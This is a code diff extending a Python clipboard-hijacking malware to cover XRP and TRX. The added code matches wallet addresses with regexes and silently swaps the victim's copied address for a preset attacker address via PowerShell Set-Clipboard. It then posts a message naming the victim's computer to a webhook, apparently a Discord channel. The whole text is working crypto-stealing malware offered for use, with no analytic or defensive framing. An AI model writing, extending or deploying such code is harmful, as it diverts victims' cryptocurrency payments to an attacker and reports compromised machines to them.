@@ -19,6 +19,8 @@ bnbaddr = "SET BNB ADDRESS HERE"
 baseaddr = "SET BASE ADDRESS HERE"
 adaaddr = "SET ADA ADDRESS HERE"
 dotaddr = "SET DOT ADDRESS HERE"
+xrpaddr = "SET XRP ADDRESS HERE"
+trxaddr = "SET TRX ADDRESS HERE"
 
 single_use = False
 
@@ -47,6 +49,8 @@ def is_crypto_addr(clipboard_text):
         base_address_pattern = r"^0x[a-fA-F0-9]{40}$"
         ada_address_pattern = r"^addr1[0-9a-z]{58,59}$"
         dot_address_pattern = r"^1[a-km-zA-HJ-NP-Z1-9]{47}$"
+        xrp_address_pattern = r"^r[1-9A-HJ-NP-Za-km-z]{25,35}$"
+        trx_address_pattern = r"^T[1-9A-HJ-NP-Za-km-z]{33}$"
 
         if re.match(btc_address_pattern, clipboard_text):
             return "BTC"
@@ -68,6 +72,10 @@ def is_crypto_addr(clipboard_text):
             return "ADA"
         elif re.match(dot_address_pattern, clipboard_text):
             return "DOT"
+        elif re.match(xrp_address_pattern, clipboard_text):
+            return "XRP"
+        elif re.match(trx_address_pattern, clipboard_text):
+            return "TRX"
         else:
             return False
     except Exception:
@@ -361,6 +369,64 @@ def main():
                                 else:
                                     message = {
                                         "content": f"```\ndetected DOT address on {comp_name} - changed to {dotaddr}\n```"
+                                    }
+
+                                json_data = json.dumps(message)
+
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
+
+                                response = conn.getresponse()
+
+                                response.read()
+                                conn.close()
+                elif var == "XRP":
+                    if xrpaddr != "SET XRP ADDRESS HERE":
+                        if clipboard_text != xrpaddr:
+                            subprocess.run(['powershell', '-command', f'Set-Clipboard -Value "{xrpaddr}"'],
+                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, startupinfo=startupinfo)
+                            if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                            if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected XRP address on {comp_name} - changed to {xrpaddr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected XRP address on {comp_name} - changed to {xrpaddr}\n```"
+                                    }
+
+                                json_data = json.dumps(message)
+
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
+
+                                response = conn.getresponse()
+
+                                response.read()
+                                conn.close()
+                elif var == "TRX":
+                    if trxaddr != "SET TRX ADDRESS HERE":
+                        if clipboard_text != trxaddr:
+                            subprocess.run(['powershell', '-command', f'Set-Clipboard -Value "{trxaddr}"'],
+                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, startupinfo=startupinfo)
+                            if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                            if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected TRX address on {comp_name} - changed to {trxaddr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected TRX address on {comp_name} - changed to {trxaddr}\n```"
                                     }
 
                                 json_data = json.dumps(message)
